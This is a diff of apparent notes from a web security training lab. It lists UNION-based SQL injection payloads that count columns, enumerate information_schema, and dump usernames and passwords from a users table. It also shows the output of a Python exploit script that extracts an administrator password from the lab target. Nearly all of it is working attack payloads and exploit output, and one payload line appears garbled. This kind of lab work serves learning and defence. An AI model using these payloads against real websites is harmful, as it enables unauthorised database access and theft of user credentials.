@@ -10,3 +10,14 @@ get number of column: /filter?category=Gifts'order+by+3--
 'union+select+null,null+FROM+information_schema.columns+WHERE+table_name='users_nvgnoi'--
 'union+select+column_name,null+FROM+information_schema.columns+WHERE+table_name='users_nvgnoi'--
 'union+select+username_ryceuy,password_enlwie+FROM+users_nvgnoi--
+
+
+python lab9.py "https://LAB_ID.web-security-academy.net"
+[+] SQL number of columns: 2
+[+] SQL Table name: users_xsycxb
+[+] SQL table name: users_xsycxb
+[+] SQL username and password: username_qgspnu password_apzbnq
+[+] SQL name of columns: username_qgspnu password_apzbnq
+https://LAB_ID.web-security-academy.net/filter?category=Gifts'union+select+username_qgspnu,password_a,password_apzbnq+FROM+users_xsycxb--
+[+] SQL administrator password found
+[+] SQL admin password: v3y4iqftoxoydbca08qv
